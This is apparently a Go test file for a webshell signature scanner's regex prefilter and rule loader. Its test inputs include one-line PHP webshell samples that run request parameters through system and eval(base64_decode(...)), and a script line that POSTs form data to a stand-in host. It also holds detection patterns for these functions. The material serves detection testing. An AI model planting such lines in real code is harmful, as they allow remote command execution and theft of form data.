package signatures

import (
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"sort"
	"testing"
)

func TestGateForExtractsRequiredLiterals(t *testing.T) {
	tests := []struct {
		name string
		src  string
		want []string
	}{
		{"single literal", `(?i)eval\s*\(`, []string{"eval"}},
		{"alternation keeps every branch", `(?i)(?:system|passthru)\s*\(`, []string{"passthru", "system"}},
		{"longest literal of a concatenation", `(?i)foo(?:bar)?bazqux`, []string{"bazqux"}},
		{"required repeat keeps its literal", `(?i)(?:abcd){2,}`, []string{"abcd"}},
		{"optional repeat gives no literal", `(?i)(?:abcd){0,3}`, nil},
		{"star gives no literal", `(?i)(?:abcd)*`, nil},
		{"character class gives no literal", `(?i)[a-z]+`, nil},
		{"branch without a literal voids the alternation", `(?i)(?:system|[0-9]+)`, nil},
		{"one-byte branch is too weak to gate", `(?i)(?:system|=)`, nil},
		{"case-sensitive literal is folded", `(?i)(?-i:ABCD)`, []string{"abcd"}},
		{"non-ASCII rune splits a literal", `(?i)caf\x{e9}teria`, []string{"teria"}},
		{"folded long s is the letter s", `(?i)\x{17f}ystem`, []string{"system"}},
		{"case-sensitive long s splits a literal", `(?i)(?-i:\x{17f}ystem)`, []string{"ystem"}},
		{"capture group is transparent", `(?i)(base64_decode)\s*\(`, []string{"base64_decode"}},
		{"escaped metacharacters are literal", `(?i)wp-config\.php`, []string{"wp-config.php"}},
		{"empty-width assertions are ignored", `(?i)\beval\b`, []string{"eval"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := []string(gateFor(tt.src))
			sort.Strings(got)
			if len(got) == 0 {
				got = nil
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("gateFor(%q) = %q, want %q", tt.src, got, tt.want)
			}
		})
	}
}

func TestFoldForGate(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"ASCII upper case folds", "EvAl(", "eval("},
		{"long s folds to s", "ſyſtem", "system"},
		{"Kelvin sign folds to k", "Key", "key"},
		{"other non-ASCII runes are kept", "café Ä", "café Ä"},
		{"invalid byte keeps decoding in step", "\xe2\xc5\xbf", "\xe2s"},
		{"truncated sequence is kept", "ab\xe2\x84", "ab\xe2\x84"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := foldForGate([]byte(tt.in)); got != tt.want {
				t.Fatalf("foldForGate(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestGateAdmits(t *testing.T) {
	gate := regexGate{"assert", "eval"}
	seen := map[string]bool{}
	if !gate.admits("<?php assert($x);", seen) {
		t.Fatal("gate rejected content holding one of its literals")
	}
	if gate.admits("<?php echo 1;", map[string]bool{}) {
		t.Fatal("gate admitted content holding none of its literals")
	}
	if !regexGate(nil).admits("anything", map[string]bool{}) {
		t.Fatal("an empty gate must admit every input")
	}
}

// A gate must never reject content its regex matches. The inputs below
// reach the regexes through the case-folding paths most likely to be
// missed: mixed case, the long s and the Kelvin sign.
func TestGateIsSoundOnFoldVariants(t *testing.T) {
	inputs := []string{
		"<?php ſyſtem($_GET['c']);",
		"<?php EVAL(base64_decode($_POST['x']));",
		"<?php $Key = 'x'; eval($_REQUEST[1]);",
		"<script>fetch('https://example.invalid/x', {method:'POST', body: new FormData(f)})</script>",
	}
	for _, src := range []string{`(?i)system\s*\(`, `(?i)key\s*=`, `(?i)eval\s*\(\s*base64_decode`} {
		re := regexp.MustCompile(src)
		gate := gateFor(src)
		for _, in := range inputs {
			if re.MatchString(in) && !gate.admits(foldForGate([]byte(in)), map[string]bool{}) {
				t.Fatalf("gate %q rejected %q, which %s matches", gate, in, src)
			}
		}
	}
}

func TestReloadSharesIdenticalRegexes(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "shared.yml", `version: 1
rules:
  - name: first
    severity: high
    category: webshell
    regexes: ['eval\s*\(']
  - name: second
    severity: high
    category: webshell
    regexes: ['eval\s*\(', 'assert\s*\(']
`)
	s := NewScanner(dir)
	if err := s.LoadError(); err != nil {
		t.Fatal(err)
	}
	first, second := s.rules[0], s.rules[1]
	if first.compiledRegexes[0] != second.compiledRegexes[0] {
		t.Fatal("identical regexes in two rules were compiled separately")
	}
	if second.compiledRegexes[0] == second.compiledRegexes[1] {
		t.Fatal("distinct regexes were merged")
	}
}

func writeRuleFile(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}
